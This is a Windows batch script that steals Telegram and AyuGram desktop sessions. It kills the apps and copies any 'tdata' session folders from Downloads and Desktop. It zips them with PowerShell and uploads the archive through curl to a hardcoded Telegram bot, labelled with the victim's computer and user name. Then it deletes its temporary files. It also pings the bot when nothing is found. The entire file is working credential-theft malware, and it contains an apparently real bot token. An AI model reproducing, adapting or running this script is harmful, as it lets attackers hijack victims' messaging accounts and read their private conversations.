@echo off
set "token=8546393587:AAEGxN5XHSiQGAS-pbRwQFmkOfREjFfCDaQ"
set "chat=990030901"
set "pc=%COMPUTERNAME%_%USERNAME%"

taskkill /f /im Telegram.exe ayugram.exe >nul 2>nul

for %%p in (
    "%USERPROFILE%\Downloads\Telegram Desktop\tdata"
    "%USERPROFILE%\Downloads\Telegram\tdata"
    "%USERPROFILE%\Downloads\AyuGram Desktop\tdata"
    "%USERPROFILE%\Downloads\AyuGram\tdata"
    "%USERPROFILE%\Downloads\tdata"
    "%USERPROFILE%\Desktop\tdata"
) do if exist "%%p" call :pack "%%p" "DOWNLOADS_%%~nxp"

if exist "%TEMP%\found" goto end

curl -s -X POST "https://api.telegram.org/bot%token%/sendMessage" -d chat_id=%chat% -d text="всё ещё пусто в Downloads :: %pc%"
goto end

:pack
xcopy "%~1" "%TEMP%\grabbed_tdata" /E/I/H/Y/Q >nul
powershell -nop -c "Compress-Archive -Force '%TEMP%\grabbed_tdata' '%TEMP%\TDATA_%pc%.zip'" >nul
curl -F chat_id=%chat% -F document=@"%TEMP%\TDATA_%pc%.zip" -F caption="НАШЁЛ В DOWNLOADS → %~2 → %pc%" https://api.telegram.org/bot%token%/sendDocument >nul
del "%TEMP%\TDATA_%pc%.zip" >nul & rd /s/q "%TEMP%\grabbed_tdata" >nul
echo 1 > "%TEMP%\found"
goto :eof

:end
exit
